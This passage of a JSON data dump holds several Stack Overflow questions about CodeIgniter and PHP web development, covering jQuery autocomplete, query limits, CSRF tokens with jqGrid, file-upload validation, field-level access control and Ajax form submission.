search file like this <code>search?q=p</code> and I get back the results. Since I'm using codeigniter the things are a bit different and I don't retrieve any results using jquery code above.</p>\n\n<p>I'm stuck with this since last night I cannot yet offer a bounty and I really need it for monday. Thank you</p>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":4683,"score":1,"question_id":5487872,"title":"using JQuery autocomplete from database with PHP (CodeIgniter)","body":"<p>So I want to use this plugin <a href=\"http://docs.jquery.com/Plugins/autocomplete\" rel=\"nofollow\">http://docs.jquery.com/Plugins/autocomplete</a></p>\n\n<p>I want to retrieve all the user names from database using codeigniter then store them in a var in javascript (If this is a good way) then use it in autocomplete. Also, I want the user if he/she enters any other text it wont be accepted, it has to be already stored in database only.</p>\n\n<p>Thanx in advanced :)</p>\n"},{"tags":["php","codeigniter","limit","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":97,"score":2,"question_id":12365432,"title":"codeigniter specifying limit to NULL not working in latest CI version 2.1.2","body":"<p>I have following <strong>get_authors_list</strong> function in one of my Codeigniter model</p>\n\n<pre><code>function get_authors_list($limit,$offset){\n    $data = array();\n\n    $this-&gt;db-&gt;select('*')-&gt;from('authors')-&gt;limit($limit,$offset)-&gt;order_by('id','desc');\n\n    $query = $this-&gt;db-&gt;get();         \n    if ($query-&gt; num_rows() &gt;  0){\n      $data = $query-&gt;result_array();\n    }\n    return $data;\n    $q-&gt;free_result();\n  }\n</code></pre>\n\n<p>Before upgrading to Codeigniter 2.1.2, I used call this method from my controller as</p>\n\n<pre><code>$data['authors'] = $this-&gt;author_model-&gt;get_authors_list(NULL, 0)\n</code></pre>\n\n<p>and it worked as expected but after upgrading to codeigniter version 2.1.2 it doesn't work, to get it working I had to specify limit as follows in my function call</p>\n\n<pre><code>$data['authors'] = $this-&gt;author_model-&gt;get_authors_list(50, 0)\n</code></pre>\n\n<p>That's specifying limit to NULL is not working, why? Am I doing anything wrong here? \nI followed Codeigniter's upgrade instruction correctly but it's some side effect I didn't expect.</p>\n\n<p>Any explanation is welcome.\nThanks !</p>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12360394,"title":"Short functions from a Codeigniter's library","body":"<p>I got a Tank Auth library installed in my Codeigniter package, the problem is that I don't like how to <code>is_logged_in</code> functions need to be called because it's simply long and not so friendly, as I need to use:</p>\n\n<p><code>$this-&gt;tank_auth-&gt;is_logged_in()</code></p>\n\n<p>Everytime I want to check if user is logged in...\nSo is there a way to make it shorter? By saying shorter I mean something like <code>$this-&gt;logged();</code>?</p>\n\n<p>I would really appreciate if someone could help me.</p>\n\n<p>Thank you.</p>\n"},{"tags":["php","codeigniter","blogs","expressionengine","categories"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12327806,"title":"Can't get blog categories to pull stylesheet styles - Expression Engine","body":"<p>So i'm trying to get the category filter on my Expression Engine blog to stay within the same layout when a category is clicked...but everytime i click on a category it jumps me over to a blank white page (so seems like its not getting any styles from anywhere for some reason).  Which is odd because my header is included w/ all my styles, etc. </p>\n\n<p>I'VE GOT MY INITIAL TEMPLATE GROUP: \"PAGE-COMPS\" (w/ two templates):</p>\n\n<p>(1) index</p>\n\n<p>(2) blog - which is as follows</p>\n\n<pre><code>{embed=\"embeds/header-inner\" my_body_class=\"blog\" my_page_title=\"Blog\"} \n\n  &lt;div class=\"mid-wrapper\"&gt;\n\n    &lt;div class=\"row blog\"&gt;\n\n      &lt;div class=\"span9\"&gt;  \n    {embed=\"posts/index\"}\n      &lt;/div&gt;\n\n  &lt;div class=\"span2\"&gt;\n     {snp_blog_sidebar}\n      &lt;/div&gt;\n\n    &lt;/div&gt;&lt;!-- end of row --&gt;\n\n  &lt;/div&gt; &lt;!-- end of mid-wrapper --&gt;\n\n{snp_footer}\n</code></pre>\n\n<p>THEN I'VE GOT MY 2ND TEMPLATE GROUP: \"EMBEDS\"</p>\n\n<p>I'VE GOT MY HEADER FILE: \"HEADER-INNER\" SEEN IN THE FILE ABOVE CODE AS FOLLOWS:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n    &lt;title&gt;{site_name} | {embed:my_page_title}&lt;/title&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;meta name=\"description\" content=\"\"&gt;\n    &lt;meta name=\"author\" content=\"\"&gt;\n\n&lt;!-- Le styles --&gt;\n&lt;link href=\"../assets/css/bootstrap.css\" rel=\"stylesheet\"&gt;\n&lt;link href=\"../assets/css/bootstrap-responsive.css\" rel=\"stylesheet\"&gt;\n\n&lt;!-- Carousel jscrollpane Styles --&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"../assets/css/jquery.jscrollpane.css\" media=\"all\" /&gt;\n\n&lt;!-- Le HTML5 shim, for IE6-8 support of HTML5 elements --&gt;\n&lt;!--[if lt IE 9]&gt;\n  &lt;script src=\"http://html5shim.googlecode.com/svn/trunk/html5.js\"&gt;&lt;/script&gt;\n&lt;![endif]--&gt;\n\n&lt;!-- Load jQuery --&gt;\n&lt;script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js\"&gt;&lt;/script&gt;\n\n&lt;!-- Load ScrollTo --&gt;\n&lt;script type=\"text/javascript\" src=\"http://flesler-plugins.googlecode.com/files/jquery.scrollTo-1.4.3.1-min.js\"&gt;&lt;/script&gt;\n&lt;!-- Load LocalScroll --&gt;\n&lt;script type=\"text/javascript\" src=\"http://flesler-plugins.googlecode.com/files/jquery.localscroll-1.2.7-min.js\"&gt;&lt;/script&gt;\n\n&lt;script type=\"text/javascript\"&gt;// &lt;![CDATA[\n    // When the document is loaded...\n    $(document).ready(function()\n    {\n        // Scroll the whole document\n        $('#section-links').localScroll({\n           target:'body'\n        });\n\n    });\n\n// ]]&gt;\n&lt;/script&gt;\n\n&lt;/head&gt;\n\n&lt;body class=\"{embed:my_body_class}\"&gt;\n\n&lt;header&gt;\n\n&lt;/header&gt;\n\n&lt;div class=\"container\"&gt;\n\n  &lt;div class=\"hero-unit\"&gt;\n    &lt;img class=\"the\" src=\"../assets/img/the.png\"&gt;\n    &lt;p&gt;&lt;a class=\"logo\" href=\"{site_url}\"&gt;Site Name&lt;span&gt; More Name&lt;/span&gt;&lt;img class=\"image\" src=\"{site_url}assets/img/image.png\" alt=\"{site_name}\"&gt;&lt;/a&gt;&lt;/p&gt;\n\n    &lt;nav id=\"section-links\"&gt;\n  &lt;a href=\"{site_url}\"&gt;Return to the Home Page&lt;/a&gt;\n    &lt;/nav&gt;\n  &lt;/div&gt;\n\n  &lt;!-- Main hero unit for a primary marketing message or call to action --&gt;\n  &lt;div class=\"hero-unit\"&gt;\n\n    &lt;div class=\"slogan\"&gt;\n      &lt;h1&gt;blog name&lt;/h1&gt;\n      &lt;p&gt;more description...&lt;/p&gt;\n    &lt;/div&gt;\n\n  &lt;/div&gt;\n</code></pre>\n\n<p>THEN I'VE GOT A LAST TEMPLATE GROUP FOR BLOG ENTRIES: CALLED \"POSTS\"</p>\n\n<p>POSTS HAS ONE TEMPLATE:</p>\n\n<p>\"INDEX\" WHICH IS AS FOLLOWS:</p>\n\n<pre><code>&lt;!-- posts list --&gt;\n            &lt;div id=\"posts-list\" class=\"cf\"&gt;  \n\n        &lt;!-- THIS ONLY KICKS IN WHEN CATEGORY IS SELECTED (CATEGORY MODE) --&gt;\n        {exp:channel:category_heading}\n            &lt;h1&gt;{category_name}&lt;/h1&gt;\n                {if category_description}\n            &lt;p&gt;{category_description}&lt;/p&gt;\n                {/if}\n        {/exp:channel:category_heading}\n\n            {exp:channel:entries channel=\"blog_audio|blog_video|blog_link|blog_quote|blog_post|blog_image\" limit=\"10\"}  \n\n            {!-- Choose appropriate snippet based on source channel --}\n                {if channel_short_name == \"blog_audio\"}\n                {snp_blog_audio}\n            {/if}\n\n            {if channel_short_name == \"blog_video\"}\n                    {snp_blog_video}\n            {/if}\n\n                {if channel_short_name == \"blog_link\"}\n                    {snp_blog_link}\n                {/if}\n\n            {if channel_short_name == \"blog_quote\"}\n                {snp_blog_quote}\n            {/if}\n\n            {if channel_short_name == \"blog_post\"}\n                {snp_blog_post}             \n            {/if}\n\n            {if channel_short_name == \"blog_image\"}\n                {snp_blog_image}\n            {/if}\n\n            {!-- Commenting out for now, we'll come back to it \n                &lt;!-- page-navigation --&gt;\n                &lt;div class=\"page-navigation cf\"&gt;\n                    &lt;div class=\"nav-next\"&gt;&lt;a href=\"#\"&gt;&amp;#8592; Older Entries &lt;/a&gt;&lt;/div&gt;\n                    &lt;div class=\"nav-previous\"&gt;&lt;a href=\"#\"&gt;Newer Entries &amp;#8594;&lt;/a&gt;&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;!--ENDS page-navigation --&gt;\n            --}\n\n        {/exp:channel:entries}\n\n    &lt;/div&gt;\n    &lt;!-- ENDS posts list --&gt;\n</code></pre>\n\n<p>LASTLY I'VE GOT A SNIPPET FOR MY SIDEBAR W/ THE CATEGORIES AS FOLLOWS:</p>\n\n<p>SNP_BLOG_SIDEBAR</p>\n\n<pre><code>&lt;!-- sidebar --&gt;\n&lt;aside id=\"sidebar\"&gt;    \n&lt;ul&gt;\n    &lt;li class=\"block\"&gt;\n        &lt;h4&gt;Our Blog&lt;/h4&gt;\n        Description of our blog goes here\n    &lt;/li&gt;\n\n    &lt;li class=\"block\"&gt;\n        &lt;h4&gt;Categories&lt;/h4&gt;\n        &lt;ul&gt;\n            {exp:channel:categories channel=\"blog_audio|blog_video|blog_link|blog_quote|blog_post|blog_image\" style=\"linear\" show_empty=\"no\"}\n                &lt;li class=\"cat-item\"&gt;&lt;a href=\"{path='blog/index'}\" title=\"{category_name}\"&gt;{category_name}&lt;/a&gt;&lt;/li&gt;\n            {/exp:channel:categories}\n        &lt;/ul&gt;\n    &lt;/li&gt;\n\n    &lt;li class=\"block\"&gt;\n        &lt;h4&gt;Archives&lt;/h4&gt;\n        &lt;ul&gt;\n            {exp:channel:month_links channel=\"blog_audio|blog_video|blog_link|blog_quote|blog_post|blog_image\" limit=\"50\"}\n                &lt;li class=\"cat-item\"&gt;&lt;a href=\"{path='blog/index'}\" title=\"title\"&gt; {month}, {year}&lt;/a&gt;&lt;/li&gt;\n            {/exp:channel:month_links}\n        &lt;/ul&gt;\n    &lt;/li&gt;\n&lt;/ul&gt;   \n&lt;/aside&gt;\n&lt;!-- ENDS sidebar --&gt;\n</code></pre>\n\n<p>I'D GREATLY APPRECIATE ANY HELP AS TO WHAT MIGHT BE GOING WRONG...AGAIN WHEN I CLICK A CATEGORY IT TAKES ME TO A BLANK WHITE PAGE LISTING THE BLOG POSTS OF THAT CATEGORY RATHER THAN KEEPING ME ON THE CURRENT BLOG DESIGN...</p>\n\n<p>THANKS A TON!</p>\n"},{"tags":["php","class","codeigniter","object","arguments"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":2,"view_count":117,"score":0,"question_id":12309738,"title":"PHP / CodeIgniter- Undefined variable in class construct","body":"<p>I have the following php errors :</p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Notice</p>\n  \n  <p>Message: Undefined variable: t</p>\n</blockquote>\n\n<p>and </p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Warning</p>\n  \n  <p>Message: Missing argument 1 for myclass::__construct(), called in\n  xxx on line 1011\n  and defined</p>\n</blockquote>\n\n<p>My controller contains :</p>\n\n<pre><code>    $this-&gt;load-&gt;model('mymodel');\n    $i = $this-&gt;mymodel-&gt;func(1);\n    print_r($i);\n</code></pre>\n\n<p>mymodel :</p>\n\n<pre><code>$test = new myclass(\"foo\", \"bar\");\n$myarray[] = $test;\nreturn $myarray\n</code></pre>\n\n<p>myclass :</p>\n\n<pre><code>class myclass {\n\nvar $a;\nvar $b;\n\npublic function __construct($t, $l) // ERROR 2\n{\n    $this-&gt;a = $t; // ERROR 1\n    $this-&gt;b = $l;\n}\n\n}\n</code></pre>\n\n<p>Note that print_r($a) in controller prints the correct object with content..</p>\n\n<p>Thanks</p>\n"},{"tags":["ajax","codeigniter","jqgrid","parameters","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12326145,"title":"passing csrf token through jqgrid on cell edit","body":"<p>I'm using Codeigniter and jqgrid to build an application.  I've recently enabled Codeigniter's builtin CSRF protection for security reasons, and it broke some stuff with jqgrid.  I've been able to pass the csrf token when jqgrid is instantiated so all my data loads (by adding the csrf token to the postData), but now anytime I edit a cell I get a 500 error because the csrf token isn't being passed.  I can verify this by looking at the post data each time I edit a cell.  I read several places that editData is what I want, but adding the token in there doesn't seem to pass it in the edit ajax request.  Any ideas?</p>\n\n<pre><code>$(\"#cust_grid\").jqGrid({\n    url:'/ajax/grid',\n    datatype: 'xml',\n    mtype: 'POST',              \n    postData: {&lt;?php echo $this-&gt;security-&gt;get_csrf_token_name().\":'\".$this-&gt;security-&gt;get_csrf_hash().\"'\"; ?&gt;},\n    editData: {&lt;?php echo $this-&gt;security-&gt;get_csrf_token_name().\":'\".$this-&gt;security-&gt;get_csrf_hash().\"'\"; ?&gt;},\n    colNames:['Name1', 'Name2'],\n    colModel :[ \n        {name:'name1', index:'name1', width:55, search: true},\n        {name:'name2', index:'name2', width:110, search: true},\n                        ],\n    pager: '#pager',\n    rowNum:25,\n    rowList:[10,25,50,100],\n    sortname: 'name1',\n    sortorder: 'asc',\n    viewrecords: true,\n    gridview: true,\n    caption: 'Customers',\n    height: 600,\n    width: 1200,\n    shrinkToFit: false,\n    altRows: true,\n    cellEdit: true,     \n    cellsubmit: \"remote\",\n    cellurl: \"/ajax/editCell\",\n},\n{}\n);\n</code></pre>\n"},{"tags":["database","codeigniter","dynamic","global-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12345733,"title":"dynamic globals in codeigniter","body":"<p>What is the best practice of having dynamic globals in codeigniter?</p>\n\n<p>I want to load a file with constants based on what key i load from the data\nI tried libraries, but they are loaded before the models get initialized</p>\n\n<p>How i want it to work:</p>\n\n<p>1) User logs in\n2) php checks if this user is a regular user (from database) or an administrator\n3) if its a regular user, i will define my global variables accordingly\n   else i will use different global variables</p>\n\n<p>This should happen only once, when person logs in. And this is exactly how i do it:</p>\n\n<p>The person logs in, php checks (in same controller) how the global variables need to be defined. It defines them, but as soon as i call on these variables from another controller they get erased. (I call on another controller with AJAX)\nOh and i should also say that CI has bugs when we run multiple AJAX requests at the same time (you cannot use CI sessions if you use simultaneous AJAX)</p>\n\n<p>SO the question really is: How do I prevent them from being erased?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","javascript","codeigniter","xmlhttprequest"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12360078,"title":"Better way of formatting arrays from javascript to php and vice versa?","body":"<p>I am creating a page that will read, write, and modify data in a mysql database.  I am using php with codeigniter to perform the queries however the page that the user will see I am powering with javascript, dynamically filling and changing the data based on the user selections.  To do this I am passing lots of data back and forth from php to javascript functions and vice versa, but I am wondering if there is a better way of formatting the data.  For example here is a javascript function that uses XMLHttpRequest to call a php function and get the result:  </p>\n\n<pre><code>var myarray = new Array(2);\nmyarray[0] = document.getElementById(\"my_input\").value;\nmyarray[1] = document.getElementById(\"my_select\").value;\nxmlhttp.open(\"POST\", \"my_url/my_function/\"+myarray.join('|'), false);\nxmlhttp.send();\ndocument.getElementById(\"my_element\").innerHTML=xmlhttp.responseText;\n</code></pre>\n\n<p>I simply do an explode() on the string passed to the php function and execute the necessary queries.  This seems like a very awkward interaction between php and javascript.  Is there a better, or at least different, way to do this?</p>\n"},{"tags":["facebook","codeigniter","session","redirect","login"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":253,"score":0,"question_id":11425255,"title":"Code Igniter redirect() not working in IE9","body":"<p>I'm trying to login to my site with Facebook and it works in all browsers except for IE9!</p>\n\n<p>My function gets all the way to 'redirect('home');' but then stops and stays on the current page. So all the session data gets set and the user is logged into Facebook, but they stay on the login page without being redirected.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>public function fb_login()\n{\n    if($this-&gt;fb_connect-&gt;user_id){\n        $this-&gt;session-&gt;unset_userdata('logged');\n        $this-&gt;session-&gt;unset_userdata('user_data');\n\n        // Check if the user had previously logged in using facebook connect\n        $fb_user = $this-&gt;fb_connect-&gt;user;\n        $user_details = $this-&gt;Model-&gt;check_fb_user($fb_user);\n        // This will then return their user details\n\n        if($user_details['status'] == 0) redirect('account');\n\n        $user_data['raw_details'] = $user_details;\n        $user_data['fb_id'] = $this-&gt;fb_connect-&gt;user_id;\n        $user_data['join_date'] = date( 'dS F, Y', strtotime($user_details['date_added']) );\n        $user_data['location'] = $user_details['user_location'];\n        $user_data['name'] = $user_details['user_fname'] . ' ' . $user_details['user_lname'];\n        $user_data['display_name'] = $user_details['user_display_name'];\n        $user_data['fb_dp'] = 'https://graph.facebook.com/'.$user_details['fb_id'].'/picture';\n\n        $this-&gt;session-&gt;set_userdata('user_data',$user_data);\n\n        if($this-&gt;session-&gt;userdata('referer')){\n            $referer = $this-&gt;session-&gt;userdata('referer');\n            $this-&gt;session-&gt;unset_userdata('referer');\n\n            redirect($referer);\n        }else{\n            redirect('home');\n        }\n\n    }else{\n                    error_log('148');\n        redirect('account/login');\n    }\n}\n</code></pre>\n\n<p>Thanks,\nStuart</p>\n"},{"tags":["php","codeigniter","installer"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1147,"score":0,"question_id":1539729,"title":"Building a CodeIgniter GUI Installer","body":"<p>I'm building a self-hosted web app using CodeIgniter and I need a nice GUI-ified installer which will present the user with a form for database info, validate and test the info, write that info to the database.php config file, and then set up the DB structure.</p>\n\n<p>Any tips for this? Should it be inside of CodeIgniter (as a Controller perhaps) or should it be its own thing (perhaps an 'install' folder which would be a sibling of 'application' and 'system')? Any projects I could look at for inspiration?</p>\n\n<p>Obviously it's not a hard task but I just didn't want to reinvent the wheel so I thought I'd ask first.</p>\n"},{"tags":["codeigniter","rest"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12359096,"title":"Codeigniter RESTful use service without key","body":"<p>I'm making a web service with codeigniter RESTFul by Phil Sturgeon.</p>\n\n<p>I'm using:</p>\n\n<p>$config['rest_enable_keys'] = TRUE;</p>\n\n<p>My idea is give each user a key to use the web services.\nThe problem is that, first the user need to create an account to get the key.\nAnd I don't know how to use a web services without a key or disable key verification to one service.</p>\n"},{"tags":["php","ajax","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":78,"score":-1,"question_id":12354428,"title":"how to show friendly message while task completes","body":"<p>I don't know if I've even asked the question properly, but I have a codeigniter application that some heaving lifting in the back end.  While the app is busy executing commands(ajax commands), I'd like to show some sort of a status / message box / div.  When the task is done, I'd like to clear the div / box. \nWhat would I need to google to find a solution like this?  </p>\n\n<p>Thanks. </p>\n\n<p><strong>Edit:</strong> \nThis is what my jquery / ajax call looks like right now...</p>\n\n<pre><code>  $('#availVLANS').click(function()  {\n  $(this).attr(\"disabled\",\"disabled\");\n  $.ajax({\n    url:\"&lt;?php echo site_url('controller/methodABC/');?&gt;\",\n    type:'POST',\n    dataType:'json',\n    success: function(returnDataFromController) {\n    var htmlstring;\n    var submitFormHTML;\n    htmlstring = \"&lt;br&gt;&lt;br&gt;&lt;B&gt;To reassign the port to a new vlan, click on a VlanId below and then click on the OK button&lt;/B&gt;&lt;br&gt;&lt;table class='table table-bordered table-striped'&gt;\";\n    htmlstring = htmlstring + \"&lt;th&gt;VlanId&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;\";\n    for(i = 0; i &lt; returnDataFromController.length; i++) {\n        //alert(returnDataFromController[i].VlanId);\n        htmlstring = htmlstring +  \"&lt;tr&gt;&lt;td&gt;&lt;a href=&gt;\"+returnDataFromController[i].VlanId+\"&lt;/a&gt;&lt;/td&gt;&lt;td&gt;\"+ returnDataFromController[i].Name+\"&lt;/td&gt;&lt;/tr&gt;\";   \n\n    }\n    submitFormHTML = \"&lt;form method='post' accept-charset='utf-8' action='\" + BASEPATH + \"index.php/switches/changeportvlan/\"+ $('#ip').val() +\"/\" + $('#hardwaremodel').val() +\"/\" + $('#port').val() + \"'&gt;&lt;input type='text' name='newVlanID' id='newVlanID' style='width:5em;height:1.5em'/&gt;&amp;nbsp;&amp;nbsp;&lt;button type='submit' class='btn' name='saveVlan' id='saveVlan' style='width:10em;height:2em'&gt;Reassign Vlan&lt;/button&gt;&lt;/form&gt;\";\n    //alert(submitFormHTML);\n    $('#clientajaxcontainer').html(htmlstring);\n    $('#newvlanform').html(submitFormHTML);                     \n\n  }\n});\n$(this).removeAttr(\"disabled\");\n  });\n</code></pre>\n"},{"tags":["php","validation","codeigniter","php-frameworks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":109,"score":0,"question_id":12289225,"title":"CodeIgniter - File upload required validation","body":"<p>I have 2 text fields and 1 file upload that are all required. Everything works when I require just the text fields, but when I require the file upload the validation error stays saying that a file is required, even though I selected one. Anyone know what I am doing wrong? Many thanks in advance.</p>\n\n<p>//view</p>\n\n<pre><code>&lt;?php echo form_open_multipart('add_msds/add'); ?&gt;\n\n&lt;fieldset&gt;\n    &lt;input type=\"text\" name=\"name\" /&gt;&lt;br&gt;\n    &lt;input type=\"text\" name=\"code\" /&gt;&lt;br&gt;\n    &lt;input type=\"file\" name=\"userfile\" /&gt;&lt;br&gt;&lt;br&gt;\n    &lt;input type=\"submit\"value=\"Add\" /&gt;\n&lt;/fieldset&gt;\n\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>//controller</p>\n\n<pre><code>public function add() {\n\n    $this-&gt;form_validation-&gt;set_rules('name', 'Name', 'required');\n    $this-&gt;form_validation-&gt;set_rules('code', 'Code', 'required');\n    //$this-&gt;form_validation-&gt;set_rules('userfile', 'Document', 'required');\n    //when the above line is active the upload does not go through\n\n    if ($this-&gt;form_validation-&gt;run() == FALSE) {\n\n        $data['page_view'] = $this-&gt;page_view;\n        $data['page_title'] = $this-&gt;page_title;\n        $this-&gt;load-&gt;view('template', $data);\n    }\n    else\n    {\n        $this-&gt;load-&gt;library('upload');\n\n        if (!empty($_FILES['userfile']['name']))\n        {\n            $config['upload_path'] = './uploads/';\n            $config['allowed_types'] = 'gif|jpg|png|jpeg';     \n\n            $this-&gt;upload-&gt;initialize($config);\n\n            if ($this-&gt;upload-&gt;do_upload('userfile'))\n            {\n                $img = $this-&gt;upload-&gt;data();\n                $file_name = $img['file_name'];\n\n                $name = $this-&gt;input-&gt;post('name');\n                $code = $this-&gt;input-&gt;post('code');\n\n                $this-&gt;load-&gt;model('create', 'create_model');\n                $this-&gt;create_model-&gt;create_entry($name, $code, $file_name);\n\n                $data['page_view'] = $this-&gt;page_view;\n                $data['page_title'] = $this-&gt;page_title;\n                $this-&gt;load-&gt;view('template', $data);\n            }\n            else\n            {\n                echo $this-&gt;upload-&gt;display_errors();\n\n            }\n        }\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter","acl","access-control","role-base-authorization"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":122,"score":1,"question_id":12356627,"title":"Field-level ACL in CodeIgniter","body":"<p>I have search SO, googled every combination of ACL, CodeIgniter, Role-based, etc and have found many good offerings for controlling access to controllers and methods, but have come up empty for something that give field-level control.</p>\n\n<p>I downloaded a couple (phpgacl and zend acl) to see if they could be easily modified to suit my needs for field-level permissions.  So before I spend the time to create one from scratch...</p>\n\n<p><strong>Question:</strong> Is there a library and/or best practice to allow <strong>field-level</strong> restrictions based on a user's login?  </p>\n\n<p>Specifically I'm looking to, depending on the AD group membership of the user, have form fields either:</p>\n\n<ul>\n<li>Not appear</li>\n<li>Appear but be read-only</li>\n<li>Be editable </li>\n</ul>\n\n<p>BTW, the AD group memberships are already available in a session variable, so I don't need that bit necessarily.  I've tagged this as both ACL and role-based, not to start another discussion on the differences, but because I'm willing to go either way if the package meets my needs.</p>\n"},{"tags":["ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":12352404,"title":"CodeIgniter Ajax form - submitting form","body":"<p>I'm new to stackoverflow and to CodeIgniter and I'm currently experimenting on some simple code examples I have found on the Internet in order to get a start. The one I'm working on right now is a form which uses CI and Ajax (jQuery) along with saving the inputs of the form in a database and then display the most recent of them on the same page as the form.\nIf I confused you it's the 4.7 application example from <a href=\"http://devsnippets.com/article/getting-started-with-codeigniter-and-how-to-create-all-those-great-apps.html\" rel=\"nofollow\">here</a>. The initial source code lies <a href=\"http://justalittlebrain.wordpress.com/2008/05/27/codeigniter-and-ajax-using-jquery-tutorial/\" rel=\"nofollow\">here</a> but I have modified it in order to work with the latest release of CI and I quote all my MVC files just below.</p>\n\n<p><strong>Controller:</strong></p>\n\n<pre><code>&lt;?php\nclass Message extends CI_Controller\n{\n    function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;helper('form');\n        $this-&gt;load-&gt;helper('url');\n        $this-&gt;load-&gt;helper('security');\n        $this-&gt;load-&gt;model('Message_model');\n    }\n\n    function view()\n    {\n        //get data from database\n        $data['messages'] = $this-&gt;Message_model-&gt;get();\n\n        if ( $this-&gt;input-&gt;is_ajax_request() ) // load inline view for call from ajax\n            $this-&gt;load-&gt;view('messages_list', $data);\n        else // load the default view\n            $this-&gt;load-&gt;view('default', $data);\n    }\n\n    //when we pres the submit button from the form\n    function add()\n    {\n        if ($_POST &amp;&amp; $_POST['message'] != NULL)\n        {\n            $message['message'] = $this-&gt;security-&gt;xss_clean($_POST['message']);\n            $this-&gt;Message_model-&gt;add($message);\n        }\n        else\n        {\n            redirect('message/view');\n        }\n    }\n}\n?&gt;\n</code></pre>\n\n<p><strong>Model:</strong></p>\n\n<pre><code>&lt;?php\nclass Message_model extends CI_Model\n{\n    function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;database();\n    }\n\n    function add($data)\n    {\n        $this-&gt;db-&gt;insert('messages', $data);\n    }\n\n    function get($limit=5, $offset=0)\n    {\n        $this-&gt;db-&gt;order_by('id', 'DESC');\n        $this-&gt;db-&gt;limit($limit, $offset);\n\n        return $this-&gt;db-&gt;get('messages')-&gt;result();\n    }\n}\n?&gt;\n</code></pre>\n\n<p><strong>Views</strong></p>\n\n<p>default.php:</p>\n\n<pre><code>&lt;!-- called using message/view --&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt;\n\n        &lt;script src=\"&lt;?php echo base_url('js/jquery-1.8.1.min.js'); ?&gt;\" type=\"text/javascript\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\"&gt;\n            $(document).ready(function()\n            {\n                $('#submit').click(function(e)\n                {\n                    e.preventDefault();\n                    var msg = $('#message').val();\n                    $.post(\"\", {message: msg}, function() {\n                        $('#content').load(\"\");\n                        $('#message').val('');\n                    });\n                });\n            });\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;?php echo form_open(\"message/add\"); ?&gt;\n        &lt;input type=\"text\" name=\"message\" id=\"message\"&gt;\n        &lt;input type=\"submit\" value=\"submit\" name=\"submit\" id=\"submit\"&gt;\n        &lt;?php echo form_close(); ?&gt;\n\n        &lt;div id=\"content\"&gt;&lt;/div&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>messages_list.php:</p>\n\n<pre><code>&lt;!-- called from ajax call --&gt;\n\n&lt;ol&gt;\n&lt;?php foreach ($messages as $cur): ?&gt;\n    &lt;li&gt;&lt;?php echo $cur-&gt;message; ?&gt;&lt;/li&gt;\n&lt;?php endforeach; ?&gt;\n&lt;/ol&gt;\n</code></pre>\n\n<p>The problem mainly lies in the 1st of the views (default.php). That is, if I omit the <code>e.preventDefault();</code> line from the javascript code then the form loads a different page (message/add as the form action parameter implies) which is a blank page, also cancelling the ajax behavior of my application that way.\nOn the other hand, if I actually add this line then the add method of my message controller isn' t called, thus not adding what I've typed into the database.</p>\n\n<p>Finally, I tried the following js code instead of the other above:</p>\n\n<pre><code>$(document).ready(function()\n            {\n                $('#submit').click(function(e)\n                {\n                    e.preventDefault();\n                    var msg = $('#message').val();\n                    $.post(\"&lt;?php echo base_url(); ?&gt;message/add\", {message: msg}, function() {\n                        $('#content').load(\"\");\n                        $('#message').val('');\n                    });\n                });\n            });\n</code></pre>\n\n<p>but that way it seems as the $.post() crashes because nothing is executed in the function which is supposed to run on a successful post() call.</p>\n\n<p>Any help appreciated and sorry for the big post. :)</p>\n"}]}
